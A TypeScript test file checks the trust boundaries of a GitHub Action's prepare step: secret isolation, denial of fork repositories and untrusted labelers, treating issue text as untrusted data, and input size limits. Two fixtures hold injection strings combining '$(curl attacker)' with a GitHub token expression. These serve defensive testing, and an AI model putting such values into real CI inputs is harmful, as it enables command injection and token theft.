import { describe, expect, test } from 'bun:test';
import {
	inputFromFixture,
	loadActionSurface,
	loadPrepareRunner,
	type PrepareDependencies,
	readDemoFixture,
	requireSecureCaller,
} from './github-action-contract';

describe('issue #2498 — least privilege and trust boundaries', () => {
	test('keeps publication permissions in the publisher job only', () => {
		requireSecureCaller(loadActionSurface());
	});

	test('does not return provider secrets from prepare', async () => {
		const prepare = await loadPrepareRunner();
		const fixture = readDemoFixture();
		const dependencies: PrepareDependencies = {
			authorize: async (input) => {
				expect('publicationToken' in input).toBe(false);
				return true;
			},
			createRuntime: () => ({
				run: async () => {},
				kill: async () => {},
				cleanup: async () => {},
			}),
			executeStage: async (_stage, context) =>
				expect(context.publicationToken).toBeUndefined(),
			evaluateGate: async () => 'approved',
			bindArtifact: async (input) => ({
				repository: input.repository,
				issueNumber: input.issueNumber,
				deliveryId: input.deliveryId,
				baseSha: 'base',
				evidence: 'redacted',
			}),
			isTransient: () => false,
			sleep: async () => {},
		};
		const result = await prepare(inputFromFixture(fixture), dependencies);
		expect(JSON.stringify(result)).not.toContain('test-provider-secret');
	});

	test('denies a foreign repository and untrusted labeler before side effects', async () => {
		const prepare = await loadPrepareRunner();
		const fixture = readDemoFixture();
		const calls: string[] = [];
		const dependencies: PrepareDependencies = {
			authorize: async () => {
				calls.push('authorize');
				return false;
			},
			createRuntime: () => {
				calls.push('runtime');
				return {
					run: async () => {},
					kill: async () => {},
					cleanup: async () => {},
				};
			},
			executeStage: async () => calls.push('stage'),
			evaluateGate: async () => 'approved',
			bindArtifact: async () => {
				calls.push('artifact');
				throw new Error('unreachable');
			},
			isTransient: () => false,
			sleep: async () => {},
		};
		const result = await prepare(
			inputFromFixture(fixture, {
				repository: fixture.forkRepository,
				labeler: 'untrusted-author',
				issueBody: '${{ github.token }} $(curl attacker)',
			}),
			dependencies,
		);
		expect(result).toEqual({ status: 'denied' });
		expect(calls).toEqual(['authorize']);
	});

	test('carries issue text as untrusted data through every stage', async () => {
		const prepare = await loadPrepareRunner();
		const fixture = readDemoFixture();
		const injectedBody = '$(curl attacker)\n${{ github.token }}';
		const seen: string[] = [];
		const dependencies: PrepareDependencies = {
			authorize: async () => true,
			createRuntime: () => ({
				run: async () => {},
				kill: async () => {},
				cleanup: async () => {},
			}),
			executeStage: async (_stage, context) => {
				seen.push(context.untrustedIssueBody);
			},
			evaluateGate: async () => 'approved',
			bindArtifact: async (input) => ({
				repository: input.repository,
				issueNumber: input.issueNumber,
				deliveryId: input.deliveryId,
				baseSha: 'base',
				evidence: 'green',
			}),
			isTransient: () => false,
			sleep: async () => {},
		};
		await prepare(
			inputFromFixture(fixture, { issueBody: injectedBody }),
			dependencies,
		);
		expect(seen).toHaveLength(7);
		expect(seen.every((body) => body === injectedBody)).toBe(true);
	});

	test('rejects issue text beyond the bounded publication size before pipeline work', async () => {
		const prepare = await loadPrepareRunner();
		const fixture = readDemoFixture();
		const dependencies: PrepareDependencies = {
			authorize: async () => {
				throw new Error('authorization must not run for oversized issue text');
			},
			createRuntime: () => {
				throw new Error('runtime must not be created for oversized issue text');
			},
			executeStage: async () => {},
			evaluateGate: async () => 'approved',
			bindArtifact: async () => ({
				repository: fixture.repository,
				issueNumber: fixture.issueNumber,
				deliveryId: fixture.deliveryId,
				baseSha: 'base',
				evidence: 'green',
			}),
			isTransient: () => false,
			sleep: async () => {},
		};
		await expect(
			prepare(
				inputFromFixture(fixture, { issueBody: 'x'.repeat(32_001) }),
				dependencies,
			),
		).rejects.toThrow(/bounded input size/);
	});
});
